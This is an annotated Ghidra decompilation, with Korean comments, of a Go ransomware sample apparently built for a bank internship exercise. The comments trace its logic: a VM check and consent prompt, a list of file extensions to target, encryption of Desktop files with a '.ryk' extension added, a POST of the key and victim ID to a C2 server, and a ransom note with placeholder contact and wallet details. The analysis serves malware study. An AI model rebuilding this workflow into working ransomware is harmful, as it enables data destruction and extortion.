// svchost.exe - main.main 함수
// Ghidra 디컴파일 분석 (핵심 부분만)

void main.main(void) {
    // 1. 가상환경 탐지 및 사용자 동의 확인
    main.isVirtualMachine();                                    // 샌드박스 - VM 환경 탐지
    
    if ((extraout_AL == '\0') &&                                // 가상환경이면 실행 , 실제 호스트에서 실행될시의 안전장치로 보여짐
       (main.MessageBox("KakaoBank", 9,                         // 문자열 - 실제 호스트일때 경고 표시
                        "This program was created for a KakaoBank internship assignment.\n\n"
                        "You must run this program only in a virtual environment...\n\n"
                        "Do you fully understand the risks and agree to run this in a virtual environment? (Y/N)",
                        0x171, 0x34), extraout_RAX != 6)) {     // 사용자가 거부하면 [ 6 = 예 / 7 = 아니오 ]
        return;                                                 // 프로그램 종료
    }

    // 2. 배경화면 이미지 생성 및 설정
    os.tempDir();
    uStack_20 = 5;
    local_28 = "w.png";                                         // 배경화면 파일명
    path/filepath.join(local_38, 2, 2);                         // TEMP_DIR/w.png 경로 생성
    local_320 = extraout_RAX_00;
    
    os.WriteFile(extraout_RAX_00, extraout_RBX,                 // 내부 데이터를 이용한 배경 생성
                 main.bgImageData.array, main.bgImageData.len, 
                 main.bgImageData.cap, 0x1b6);
    
    main.setWallpaper(local_320, extraout_RBX);

    // 3. 암호화 대상 파일 확장자 목록 설정
    local_178 = 3;  local_180 = "pdf";                         // PDF 파일
    local_168 = 3;  local_170 = "xls";                         // Excel 파일
    local_158 = 4;  local_160 = "xlsx";                        // Excel 파일
    local_148 = 3;  local_150 = "ppt";                         // PowerPoint 파일
    local_138 = 4;  local_140 = "pptx";                        // PowerPoint 파일
    local_128 = 3;  local_130 = "hwp";                         // 한글 파일
    local_118 = 3;  local_120 = "jpg";                         // JPEG 이미지
    local_108 = 4;  local_110 = "jpeg";                        // JPEG 이미지
    local_f8 = 3;   local_100 = "png";                         // PNG 이미지
    local_e8 = 3;   local_f0 = "doc";                          // Word 문서
    local_d8 = 4;   local_e0 = "docx";                         // Word 문서
    local_c8 = 3;   local_d0 = "zip";                          // 압축 파일
    local_b8 = 3;   local_c0 = "mp4";                          // 동영상 파일
    local_a8 = 3;   local_b0 = "avi";                          // 동영상 파일
    local_98 = 3;   local_a0 = "txt";                          // 텍스트 파일

    // 4. 암호화 경로 설정 (기본: Desktop, path 옵션으로 변경 가능)
    flag.(*FlagSet).String((flag.FlagSet *)flag.CommandLine,
                           "path", 4, 0, 0, "Encrypt path", 0xc);  // path 플래그 정의
    flag.(*FlagSet).Parse(...);
    
    os.Getenv("USERPROFILE", 0xb);                                // 사용자 프로필 경로 저장
    uStack_188 = 7;
    local_190 = "Desktop";                                        // 기본 경로: Desktop [ Users ~ ]
    path/filepath.join(local_1a0, 2, 2);                          // USERPROFILE/Desktop 경로 생성
    
    if (local_318[1] == 0) {                                       // path 옵션이 없으면 IF분기 시작
        local_308 = extraout_RAX_04;                               // Desktop 경로 사용
    } else {                                                       // path 옵션이 있으면
        local_308 = *local_318;                                    // 지정된 경로 사용 [ 인자 값 ]
    }

    // 5. 암호화 키 생성 및 준비
    main.GenerateKey();                                            // 랜섬웨어 암호화 키 생성
    
    // 키를 16진수 문자열로 변환 후 다시 바이트로 디코드 (키 검증 과정)
    encoding/hex.DecodeString(extraout_RAX_08, extraout_RBX_03);   // 생성된 키 검증
    local_2f8 = extraout_RAX_09;                                   // 최종 암호화 키

    // 6. 파일 탐색 및 암호화 실행
    main.MapFiles(local_308, uVar8);                               // 암호화 대상 파일 매핑
    
    while (0 < iVar10) {                                           // 찾은 파일들에 대해 반복
        // 파일 확장자 추출
        strings.TrimLeft(iVar5, iVar9, ".", 1);                    // 확장자에서 '.' 제거
        
        // 확장자가 암호화 대상 목록에 포함되는지 확인
        while (0 < iVar5) {                                        // 확장자 목록 순회
            runtime.efaceeq(&datatype.String.string, &local_1d8, local_1b0);  // 확장자 비교
            if (extraout_AL_00 != '\0') {                          // 일치하는 확장자 발견
                bVar3 = true;
                goto LAB_00645a60;
            }
        }
        
LAB_00645a60:
        if (((bVar3) &&                                            // 암호화 대상이고
            (os.ReadFile(local_310, uVar7), iVar10 == 0)) &&       // 파일 읽기 성공하고
           (github.com/Oakak-Knab/enc.Encrypt                      // 암호화 실행 성공
                      (extraout_RAX_11, uVar7, uVar8, local_2f8, 
                       extraout_RBX_04, local_370),
           extraout_RDI_02 == 0)) {
            
            os.WriteFile(local_310, uVar7,                          // 파일 덮어쓰기
                         extraout_RAX_12, extraout_RBX_06, 
                         extraout_RCX_03, 0x1a4);
            
            runtime.concatstring2(0, local_310, uVar7, ".ryk", 4);  // .ryk 확장자 추가
            os.rename(local_310, uVar7,                             // 원본파일명.ryk로 이름 변경
                      extraout_RAX_13, extraout_RBX_07);
            local_350 = local_350 + 1;
        }
    }

    // 7. C2 서버에 암호화 결과 전송
    github.com/google/uuid.NewString();                           // UUID 생성 [피해자 식별용]
    local_2e8 = extraout_RAX_16;
    
    // JSON 페이로드 생성 (키, UUID 포함)
    runtime.newobject(&datatype.Struct.main.Payload);             // 페이로드 구조체 생성
    encoding/json.Marshal(&datatype.Ptr.*main.Payload, puVar6);   // JSON으로 직렬화
    
    // C2 서버로 POST 요청
    net/http.(*Client).Post                                        // HTTP POST 요청으로 결과 전송
              ((http.Client *)net/http.DefaultClient, 
               &DAT_00738f98, 0x1e,                                // C2 서버 URL
               "application/json", 0x10,                           // Content-Type
               &go:itab.*bytes.Buffer, io.Reader, puVar6);

    // 8. 랜섬노트 생성 및 저장
    runtime.concatstring3                                          // 랜섬 메시지 생성
              (0, "\n\tYour network has been penetrated.\n\t"
               "All files on each host in the network has been encrypted...\n\t"
               "contact us at no-reply@malicious.com\n\n\t"
               "BTC wallet:123-456-7890\n\n\t"
               "Recovery Key : ", 0x2f3,
               local_2e8, local_358, "\n", 1);
    
    os.Getenv("UserProfile", 0xb);
    local_2b0 = "Desktop";
    local_2a0 = "readme.txt";                                     // 랜섬노트 파일명
    path/filepath.join(local_2c0, 3, 3);                          // Desktop/readme.txt 경로
    
    runtime.stringtoslicebyte(0, local_300, extraout_RBX_13);
    os.WriteFile(local_330, extraout_RBX_14,                      // 랜섬노트 파일 생성
                 extraout_RAX_28, extraout_RBX_15, 
                 extraout_RCX_06, 0x1a4);
    
    return;
}
